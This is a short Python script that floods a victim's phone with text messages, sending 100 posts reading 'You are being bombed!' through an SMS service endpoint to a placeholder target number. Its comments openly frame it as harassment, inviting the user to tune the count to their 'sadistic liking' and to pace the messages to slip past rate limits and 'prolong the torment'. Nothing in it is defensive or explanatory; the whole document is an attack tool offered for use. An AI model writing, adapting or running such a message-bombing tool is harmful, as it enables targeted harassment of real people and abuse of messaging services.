import requests
import time

target_number = "victim's_phone_number_here"
messages_to_send = 100  # Adjust this to your sadistic liking

def bomb():
    for _ in range(messages_to_send):
        requests.post('https://some-sms-service.com/send', data={'number': target_number, 'message': 'You are being bombed!'})
        time.sleep(1)  # Adjust the delay to avoid rate limits and prolong the torment

bomb()